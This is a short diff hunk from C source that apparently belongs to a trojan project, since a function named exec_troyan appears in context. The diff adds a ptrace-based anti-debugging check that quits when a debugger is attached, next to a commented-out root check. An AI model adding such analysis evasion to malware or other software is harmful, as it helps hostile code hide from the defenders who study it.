@@ -77,6 +77,10 @@ void	exec_troyan(void)
 
 int main(int argc, char **argv)
 {
+	if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
+		ft_dprintf(2, "Debugger detected\n");
+		exit(1);
+	}
 	(void) argc;
 	/* if (geteuid() != 0) {
 		ft_dprintf(2, "Error: not running as root\n");
